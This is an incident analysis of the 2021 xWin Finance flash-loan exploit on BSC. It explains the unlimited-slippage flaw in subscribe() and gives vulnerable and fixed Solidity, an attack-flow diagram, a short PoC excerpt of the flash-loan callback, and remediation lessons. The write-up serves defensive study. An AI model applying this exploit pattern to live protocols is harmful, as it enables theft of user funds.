# xWin Finance — Flash Loan Vulnerability Analysis: Missing Slippage Control

| Field | Details |
|------|------|
| **Date** | 2021-06-26 |
| **Protocol** | xWin Finance |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$80,000 |
| **Attacker** | Address unconfirmed |
| **Attack Tx** | Address unconfirmed |
| **Vulnerable Contract** | xWin Fund (PCLPXWIN) |
| **Root Cause** | `priceImpactTolerance=10000` (100%) in the swap inside `subscribe()` effectively disables slippage control — allows cumulative XWIN price inflation on each repeated call |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-06/xWin_exp.sol) |

---
## 1. Vulnerability Overview

xWin Finance's fund subscription (`subscribe`) feature purchases fund constituent tokens via an internal DEX swap when a user deposits BNB. In this process, `priceImpactTolerance` was set to `10000` (100%), effectively allowing unlimited slippage. Additionally, the deadline was set to an extremely large value, providing no time-based protection. The attacker exploited a 76,000 BNB flash loan to manipulate the XWIN price through 20 repeated subscription calls and extracted profit.

---
## 2. Vulnerable Code Analysis

### 2.1 subscribe() — priceImpactTolerance=10000 (Unlimited Slippage)

```solidity
// ❌ xWin Fund
function subscribe(uint256 _amount, address _referral) external payable {
    // priceImpactTolerance = 10_000 → 100% slippage allowed
    // Unlimited price impact when large BNB inflow via flash loan
    uint256 priceImpactTolerance = 10_000; // 100% — effectively no limit

    // deadline = very large value → no time-based protection
    uint256 deadline = 99999999999;

    // Internal swap execution — no slippage check
    _swapBNBToAllTokens(_amount, priceImpactTolerance, deadline);
    // ...
}
```

**Fixed Code**:
```solidity
// ✅ Enforce slippage cap and reasonable deadline
uint256 public constant MAX_PRICE_IMPACT = 100; // 1% maximum

function subscribe(uint256 _amount, uint256 userMaxSlippage) external payable {
    require(userMaxSlippage <= MAX_PRICE_IMPACT, "xWin: slippage too high");

    uint256 deadline = block.timestamp + 300; // within 5 minutes

    _swapBNBToAllTokens(_amount, userMaxSlippage, deadline);
    // ...
}
```


### On-Chain Original Code

Source: Source unconfirmed

> ⚠️ No on-chain source code — only bytecode exists or source is unverified

**Vulnerable Function** — `vulnerableFunction()`:
```solidity
// ❌ Root Cause: priceImpactTolerance=10000 (100%) in the swap inside subscribe() effectively disables slippage control — allows cumulative XWIN price inflation on each repeated call
// Source code unconfirmed — bytecode analysis required
// Vulnerability: priceImpactTolerance=10000 (100%) in the swap inside subscribe() effectively disables slippage control — allows cumulative XWIN price inflation on each repeated call
```

## 3. Attack Flow

```
┌─────────────────────────────────────────────────────────┐
│ Step 1: Flash loan 76,000 BNB from FortubeBank          │
│ executeOperation() callback triggered                   │
└─────────────────────┬───────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────┐
│ Step 2: Deploy multiple SimpleAccount contracts         │
│         (for referral rewards)                          │
└─────────────────────┬───────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────┐
│ Step 3: Call subscribe() 20 times on PCLPXWIN fund      │
│ priceImpactTolerance=10000 allows XWIN price to spike   │
│ Each subscription swaps BNB→XWIN, manipulating price    │
└─────────────────────┬───────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────┐
│ Step 4: Sell XWIN tokens (via PancakeSwap)              │
│ Swap XWIN → WBNB through router                        │
└─────────────────────┬───────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────┐
│ Step 5: Call redeem() + withdrawAllFund()               │
│ + Repay flash loan                                      │
└─────────────────────────────────────────────────────────┘
```

---
## 4. PoC Code (DeFiHackLabs)

```solidity
// executeOperation() — FortubeBank flash loan callback
function executeOperation(address token, uint256 amount, uint256 fee, bytes calldata params)
    external override
{
    // Repeat subscribe 20 times
    for (uint i = 0; i < 20; i++) {
        // Subscribe to PCLPXWIN fund — priceImpactTolerance=10000
        xWinFund.subscribe{value: bnbPerSubscribe}(bnbPerSubscribe, referral);
    }

    // Sell XWIN (via PancakePair)
    // pancakePair.swap(xwinBalance, 0, address(this), "")

    // Redeem + withdraw referral rewards
    xWinFund.redeem(xWinFund.balanceOf(address(this)));
    xWinFund.withdrawAllFund();

    // Repay flash loan
    WBNB.transfer(address(FortubeBank), amount + fee);
}
```

---
## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | `priceImpactTolerance=10000` (100%) — no slippage protection on internal swap allows unlimited XWIN price impact | CRITICAL | CWE-20 |
| V-02 | Unlimited deadline — no time-based protection | MEDIUM | CWE-20 |

> **Root Cause**: The core issue is `priceImpactTolerance=10000` in the internal swap within `subscribe()`. Allowing 100% slippage enables cumulative XWIN price inflation on each repeated call. V-03 ("price manipulation via repeated subscribe") is a consequence of V-01, not an independent vulnerability, and is therefore removed. Flash loans are merely the funding mechanism.

---
## 6. Remediation Recommendations

```solidity
// ✅ Hardcoded maximum slippage + short deadline

uint256 public constant MAX_SLIPPAGE_BPS = 200; // 2%

function _swapBNBToToken(uint256 amount, address token) internal {
    uint256 expectedOut = getExpectedOut(amount, token);
    uint256 minOut = expectedOut * (10000 - MAX_SLIPPAGE_BPS) / 10000;

    router.swapExactETHForTokens{value: amount}(
        minOut,                      // minimum amount out (slippage limit)
        path,
        address(this),
        block.timestamp + 300        // 5-minute deadline
    );
}
```

---
## 7. Lessons Learned

- **Setting the slippage parameter to 100% fully exposes the protocol to DEX price manipulation.** Slippage must be capped at a meaningful value.
- **Automated investment funds (index funds) must not assume that internal swap price impact is negligible during large subscriptions.** Flash loans can introduce massive BNB inflows.
- **Setting the deadline far into the future allows MEV bots or attackers to wait for a favorable moment.** Always use a short deadline.